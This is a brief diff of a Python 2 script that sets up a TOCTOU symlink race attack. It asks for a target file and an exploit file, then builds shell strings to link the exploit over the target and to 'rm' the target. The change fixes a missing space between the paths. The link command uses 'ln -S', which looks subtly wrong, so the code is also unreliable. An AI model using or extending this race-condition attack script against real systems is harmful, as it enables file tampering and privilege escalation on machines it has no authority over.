@@ -10,7 +10,7 @@ file_to_check = '"'
 def set_up_toctou_attempt():
 	file_to_check = raw_input("Enter file (with path) to try to target")
 	exploit = raw_input("Enter exploit file (with path)")
-	alias_create_link = "ln -S " + exploit + file_to_check
+	alias_create_link = "ln -S " + exploit + " " + file_to_check
 	alias_delete_link = "rm " + file_to_check
 	print "Ready for toctou attempt"
 
